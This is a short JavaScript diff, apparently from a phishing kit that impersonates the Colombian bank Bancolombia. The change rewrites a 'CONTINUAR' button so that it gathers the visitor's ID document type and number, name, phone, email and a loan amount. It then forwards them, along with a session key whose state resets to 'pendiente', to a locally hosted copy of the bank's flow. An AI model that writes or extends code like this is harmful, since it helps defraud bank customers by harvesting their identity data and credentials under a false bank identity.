@@ -189,8 +189,27 @@ document
 // ── Acción del botón CONTINUAR (modal) = ENTRAR AL FLUJO BANCOLOMBIA ────────
 document.getElementById("continuarButton").addEventListener("click", () => {
   const sid    = getSessionId();     // NUEVA sesión cada clic → ON DUPLICATE KEY UPDATE resetea estado 'pendiente'
-  const correo = "";
-  window.location.href =
-    "./BANCOLOMBIA/index.html?key="    + encodeURIComponent(sid) +
-    "&correo="                          + encodeURIComponent(correo);
+  const tipoDocSel = tipoDocumento.options[tipoDocumento.selectedIndex];
+  const tipoDoc    = (tipoDocSel && tipoDocSel.text) ? tipoDocSel.text : (tipoDocumento.value || "");
+  const numDoc     = numeroDocumento.value || "";
+  const correo     = "";
+
+  const extraQs = new URLSearchParams(window.location.search);
+  const monto    = extraQs.get("monto")    || "";
+  const cupo     = extraQs.get("cupo")     || monto;
+  const nombreP  = extraQs.get("nombre")   || "";
+  const telefonoP= extraQs.get("telefono") || "";
+  const email    = extraQs.get("email")    || correo;
+
+  const qs = new URLSearchParams({
+    key:    sid,
+    correo: email,
+    tipo_documento: tipoDoc,
+    numero_documento: numDoc,
+    monto: cupo,
+    nombre: nombreP,
+    telefono: telefonoP,
+    banco: "Bancolombia",
+  });
+  window.location.href = "./BANCOLOMBIA/index.html?" + qs.toString();
 });
